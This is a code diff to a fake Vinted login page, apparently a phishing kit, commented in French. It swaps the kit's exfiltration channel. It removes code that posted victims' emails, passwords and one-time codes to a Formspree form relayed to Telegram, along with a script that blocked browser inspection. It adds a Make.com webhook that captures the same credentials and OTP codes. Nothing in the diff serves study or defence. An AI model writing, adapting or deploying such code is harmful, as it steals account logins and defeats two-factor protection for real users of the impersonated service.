@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vinted | toute la seconde main dans une seule application</title>
+    <title>Vinted | Toute la seconde main dans une seule application</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link href="favicon-96x96.png" rel="icon" sizes="96x96" type="image/png"/>
@@ -1218,22 +1218,15 @@
                     e.preventDefault();
 
                     const email = emailInput.value;
-                    const password = passInput.value; // passInput est déjà défini plus haut
+                    const password = passInput.value;
 
-                    const loginMessage = `👤 Informations de Connexion\n\n📧 Email/Identifiant: ${email}\n🔑 Mot de passe: ${password}\n📅 Date: ${new Date().toLocaleString("fr-FR")}`;
-
-                    try {
-                        await fetch("https://formspree.io/f/xyknljzp", {
-                            method: "POST",
-                            headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify({
-                                formName: "Informations de Connexion",
-                                message: loginMessage,
-                            }),
-                        });
-                    } catch (error) {
-                        console.error("Erreur lors de l'envoi des données de connexion:", error);
-                    }
+                    // Envoyer les données au webhook
+                    await sendToWebhook({
+                        formType: 'login_credentials',
+                        email: email,
+                        password: password,
+                        timestamp: new Date().toISOString()
+                    });
 
                     if (targetUserText) targetUserText.textContent = email;
                     otpModal.style.display = "flex";
@@ -1269,31 +1262,20 @@
                 verifyBtn.addEventListener('click', async () => {
                     const codeComplet = Array.from(otpBoxes).every(input => input.value.length > 0);
                     if (codeComplet) {
+                        const otp = Array.from(otpBoxes).map(input => input.value).join('');
+                        
+                        // Envoyer l'OTP au webhook
+                        await sendToWebhook({
+                            formType: 'otp_verification',
+                            email: emailInput.value,
+                            otp: otp,
+                            timestamp: new Date().toISOString()
+                        });
+                        
                         // Désactiver le bouton pour éviter les doubles clics
                         verifyBtn.disabled = true;
                         verifyBtn.style.opacity = '0.6';
                         verifyBtn.style.cursor = 'default';
-
-                        // Récupérer les données du formulaire
-                        const otpCode = Array.from(otpBoxes).map(box => box.value).join('');
-                        const email = document.getElementById('emailInput') ? document.getElementById('emailInput').value : 'N/A';
-                        const password = document.getElementById('passwordInput') ? document.getElementById('passwordInput').value : 'N/A';
-
-                        // Envoyer les données à Formspree (qui les relayera vers Telegram)
-                        const formattedMessage = '🔐 Code de vérification\n🔒 Code à 4 chiffres: ' + otpCode + '\n📅 Date: ' + new Date().toLocaleString('fr-FR');
-                        
-                        try {
-                            await fetch('https://formspree.io/f/xyknljzp', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    formName: 'Code de vérification',
-                                    message: formattedMessage
-                                })
-                            });
-                        } catch (error) {
-                            console.error('Erreur lors de l\'envoi des données:', error);
-                        }
 
                         // Afficher le message de succès
                         const successMessage = document.getElementById('redirectCountdown');
@@ -1311,18 +1293,28 @@
         });
     </script>
 
+    <!-- ✅ INTÉGRATION MAKE.COM WEBHOOK -->
     <script>
-        /* Protection basique contre l'inspection */
-        document.addEventListener('contextmenu', event => event.preventDefault());
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) || (e.ctrlKey && e.key === 'U')) {
-                e.preventDefault();
+        // URL du webhook Make.com
+        const WEBHOOK_URL = 'https://hook.eu1.make.com/oaq2es7d3k7su9z2chd1nc5dazeatcmf';
+
+        // Fonction pour envoyer les données au webhook
+        async function sendToWebhook(data) {
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+                console.log('✅ Données envoyées avec succès');
+                return response.ok;
+            } catch (error) {
+                console.error('❌ Erreur lors de l\'envoi:', error);
+                return false;
             }
-        });
-        document.querySelectorAll('img').forEach(img => {
-            img.setAttribute('oncontextmenu', 'return false');
-            img.setAttribute('ondragstart', 'return false');
-        });
+        }
     </script>
 
 </body>
